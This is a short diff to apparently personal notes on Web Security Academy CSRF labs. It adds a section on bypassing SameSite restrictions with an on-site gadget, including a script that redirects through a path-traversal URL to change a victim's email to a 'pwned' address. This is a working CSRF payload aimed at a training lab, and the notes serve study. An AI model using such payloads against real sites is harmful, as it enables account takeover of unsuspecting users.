@@ -161,3 +161,13 @@ csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
 </form>
 ```
 
+#### Bypassing SameSite restrictions using on-site gadgets
+
+- we can use the build in functionality to execute CSRF
+
+```html
+<script>
+    document.location = "https://0a2d00a3039f3de580420d0400d700fe.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+```
+
